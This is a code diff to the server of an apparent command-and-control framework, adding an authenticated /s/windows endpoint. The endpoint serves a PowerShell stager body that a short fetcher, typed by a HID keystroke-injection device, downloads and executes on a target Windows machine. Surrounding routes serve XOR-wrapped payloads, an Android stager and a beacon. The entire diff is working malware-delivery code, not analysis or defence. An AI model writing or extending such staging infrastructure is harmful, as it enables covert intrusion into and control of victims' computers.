@@ -1371,6 +1371,38 @@ async def handle_android_stager(request: web.Request) -> web.Response:
         return web.Response(status=500)
 
 
+async def handle_short_stager(request: web.Request) -> web.Response:
+    """GET /s/windows — the PowerShell BODY a short HID stager ``iex``es.
+
+    The typed HID command is a ~300-char fetcher; the heavy stager script it
+    runs is served HERE, authenticated like the rest of the stager family.
+    The body comes from ``builder.windows_stager_script``, i.e. it is decoded
+    out of the SAME ``generate_dropper`` call the inline path types, so the
+    artefact is byte-identical whichever way it is delivered — which is what
+    lets a board be switched from inline to download without changing what
+    lands on the target.
+    """
+    try:
+        if not _payload_token_ok(request):
+            return web.Response(status=403,
+                                text="Forbidden: Invalid auth token")
+        from phantom.utils.builder import windows_stager_script
+        host = server_instance.host if server_instance.host != "0.0.0.0" \
+            else request.headers.get("Host", request.url.host)
+        if ":" in host:
+            host = host.split(":")[0]
+        port = server_instance.port or request.url.port or 80
+        use_ssl = request.scheme == "https"
+        script = windows_stager_script(host, port, use_ssl=use_ssl)
+        if not script:
+            logger.error("Short stager: generate_dropper produced no body")
+            return web.Response(status=500, text="Stager unavailable")
+        return web.Response(text=script, content_type="text/plain")
+    except Exception as e:
+        logger.error(f"Short stager error: {e}")
+        return web.Response(status=500)
+
+
 async def handle_payload_pic(request: web.Request) -> web.Response:
     """GET /x — Serve the authenticated XOR-wrapped PIC payload."""
     try:
@@ -1705,6 +1737,8 @@ class C2Server:
         app.router.add_get("/api/v1/remote_payload_android", handle_payload)
         # One-liner platform stagers
         app.router.add_get("/s/android", handle_android_stager)
+        # HID download stager: the script a ~300-char typed fetcher runs
+        app.router.add_get("/s/windows", handle_short_stager)
         # Ultra-compact PIC stager endpoint (XOR-encrypted beacon.bin)
         app.router.add_get("/x", handle_payload_pic)
         app.router.add_get("/", lambda r: web.Response(text="C2 OK"))
